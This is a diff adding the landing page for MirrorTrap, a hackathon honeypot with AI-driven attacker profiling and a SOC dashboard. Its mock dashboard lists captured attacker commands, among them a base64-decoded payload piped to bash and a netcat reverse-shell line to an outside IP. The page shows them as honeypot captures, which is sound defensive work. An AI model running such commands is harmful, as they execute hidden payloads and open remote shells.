+          </div>
+          <div class="dash-attacker">
+            <div class="da-avatar" style="background:var(--accent-dim);color:var(--accent)">👤</div>
+            <div><div class="da-name">Attacker 5</div><div class="da-ip">178.128.23.11</div></div>
+            <div class="da-pill pill-low">Low</div>
+          </div>
+        </div>
+        <div class="dash-main">
+          <div class="dash-section-title">Attacker Report · 162.55.196.130</div>
+          <div class="mini-stat-row">
+            <div class="mini-stat"><div class="ms-label">IP Address</div><div class="ms-val" style="font-size:13px;margin-top:2px;color:var(--text)">162.55.196.130</div></div>
+            <div class="mini-stat"><div class="ms-label">Auth Result</div><div class="ms-val" style="font-size:13px;margin-top:2px;color:var(--red)">✗ BREACH</div></div>
+            <div class="mini-stat"><div class="ms-label">Commands</div><div class="ms-val">9</div></div>
+            <div class="mini-stat"><div class="ms-label">HTTP Attacks</div><div class="ms-val">2</div></div>
+          </div>
+          <div class="dash-section-title">Captured Commands</div>
+          <div class="mini-cmd-list">
+            <div class="mini-cmd"><span class="mc-prompt">$</span><span class="mc-text">cat /proc/version &amp;&amp; ip route</span></div>
+            <div class="mini-cmd"><span class="mc-prompt">$</span><span class="mc-text w">find /var /etc -mtime -1 2&gt;/dev/null</span></div>
+            <div class="mini-cmd"><span class="mc-prompt">$</span><span class="mc-text d">base64 -d /tmp/.payload | bash</span></div>
+            <div class="mini-cmd"><span class="mc-prompt">$</span><span class="mc-text d">mkfifo /tmp/pipes &amp;&amp; cat /tmp/pipes | nc 162.55.196.130 4444</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Features ──────────────────────────────────────────────────────────── -->
+  <section id="features">
+    <div class="reveal">
+      <div class="section-tag">⚡ Features</div>
+      <h2 class="section-title">Everything you need to<br/>hunt attackers</h2>
+    </div>
+
+    <div class="feature-grid reveal">
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:var(--accent-dim);border-color:rgba(0,245,196,0.2)">🪤</div>
+        <div class="feature-title">SSH &amp; HTTP Honeypot</div>
+        <div class="feature-desc">Emulates real services including SSH login prompts, web admin panels, and misconfigured APIs to attract opportunistic and targeted attackers.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:var(--red-dim);border-color:rgba(255,77,109,0.2)">🧠</div>
+        <div class="feature-title">Gemini AI Threat Profiling</div>
+        <div class="feature-desc">Each attacker session is analyzed by Google Gemini — classifying attacker type, skill level (Low → Nation-State), tools used, and intent in plain English.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:rgba(96,165,250,0.1);border-color:rgba(96,165,250,0.2)">📡</div>
+        <div class="feature-title">Real-Time SOC Dashboard</div>
+        <div class="feature-desc">Live-updating React dashboard with attacker list, command history, attack timeline, IP geolocation, and auto-refresh — all in a dark SOC aesthetic.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:rgba(167,139,250,0.1);border-color:rgba(167,139,250,0.2)">🌍</div>
+        <div class="feature-title">IP Geolocation &amp; Flags</div>
+        <div class="feature-desc">Resolve attacker IPs to country, city, ISP, and ASN. Country flags displayed inline. Proxy/VPN/Hosting flags are highlighted automatically.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:rgba(255,209,102,0.1);border-color:rgba(255,209,102,0.2)">🗄️</div>
+        <div class="feature-title">SQLite Session Database</div>
+        <div class="feature-desc">Every session, command, and HTTP attack is persisted to a local SQLite database with full query support — no external DB needed.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon-wrap" style="background:rgba(255,140,66,0.1);border-color:rgba(255,140,66,0.2)">⏱️</div>
+        <div class="feature-title">Attack Timeline</div>
+        <div class="feature-desc">Horizontally-scrolling timeline shows every event in chronological order — session start, commands, HTTP scans — color-coded by event type.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Attack Types ───────────────────────────────────────────────────────── -->
+  <section id="attacks">
+    <div class="reveal">
+      <div class="section-tag">🎯 Attack Coverage</div>
+      <h2 class="section-title">Detects 12+ attack<br/>patterns out of the box</h2>
+      <p class="section-sub">From basic brute-force to nation-state APT techniques — MirrorTrap classifies them all.</p>
+    </div>
+
+    <div class="attacks-grid reveal">
+      <div class="attack-chip"><div class="dot dot-red"></div>Credential Brute Force</div>
+      <div class="attack-chip"><div class="dot dot-red"></div>Auth Breach / Shell Drop</div>
+      <div class="attack-chip"><div class="dot dot-orange"></div>Ransomware Staging</div>
+      <div class="attack-chip"><div class="dot dot-orange"></div>Crypto-Miner Install</div>
+      <div class="attack-chip"><div class="dot dot-yellow"></div>SQL Injection</div>
+      <div class="attack-chip"><div class="dot dot-yellow"></div>WordPress Exploit</div>
+      <div class="attack-chip"><div class="dot dot-accent"></div>Port / Network Scan</div>
+      <div class="attack-chip"><div class="dot dot-accent"></div>ENV / Secrets Exposure</div>
+      <div class="attack-chip"><div class="dot dot-blue"></div>AWS Credentials Scan</div>
+      <div class="attack-chip"><div class="dot dot-blue"></div>LFI / Path Traversal</div>
+      <div class="attack-chip"><div class="dot dot-purple"></div>Botnet C2 Drop</div>
+      <div class="attack-chip"><div class="dot dot-purple"></div>Lateral Movement / AD</div>
+    </div>
+  </section>
+
+  <!-- ── Tech Stack ─────────────────────────────────────────────────────────── -->
+  <section id="tech" style="text-align:center">
+    <div class="reveal">
+      <div class="section-tag">🛠️ Tech Stack</div>
+      <h2 class="section-title">Built with modern,<br/>production-grade tools</h2>
+    </div>
+
+    <div class="tech-row reveal">
+      <div class="tech-chip">🐍 Python 3 + Flask</div>
+      <div class="tech-chip">⚛️ React + Vite</div>
+      <div class="tech-chip">🗄️ SQLite</div>
+      <div class="tech-chip">🔮 Google Gemini AI</div>
+      <div class="tech-chip">🌐 ip-api.com Geo</div>
+      <div class="tech-chip">🎨 Custom CSS Design System</div>
+      <div class="tech-chip">🔒 SSH Honeypot Layer</div>
+      <div class="tech-chip">📡 Flask REST API</div>
+    </div>
+  </section>
+
+  <!-- ── CTA ───────────────────────────────────────────────────────────────── -->
+  <div class="cta-section">
+    <div class="cta-box reveal">
+      <h2>Ready to catch attackers<br/>in the act?</h2>
+      <p>Clone MirrorTrap, run the server, and start collecting real-world attack intelligence in under 5 minutes.</p>
+      <div class="cta-btns">
+        <a href="https://github.com/Shrak-24/honeypot" target="_blank" class="btn-primary">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          Clone on GitHub
+        </a>
+        <a href="#how-it-works" class="btn-secondary">Learn More</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Footer ────────────────────────────────────────────────────────────── -->
+  <footer>
+    <div class="footer-logo">
+      <div class="nav-logo-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      </div>
+      MirrorTrap
+    </div>
+    <div class="footer-links">
+      <a href="https://github.com/Shrak-24/honeypot" target="_blank">GitHub</a>
+      <a href="https://github.com/Shrak-24/honeypot/issues" target="_blank">Issues</a>
+      <a href="https://github.com/Shrak-24/honeypot/blob/main/README.md" target="_blank">Docs</a>
+    </div>
+    <div class="footer-copy">© 2026 MirrorTrap · Built for Hackathon · Shrak-24</div>
+  </footer>
+
+  <script>
+    // Scroll reveal
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible') })
+    }, { threshold: 0.1 })
+    document.querySelectorAll('.reveal').forEach(el => observer.observe(el))
+  </script>
+</body>
+</html>
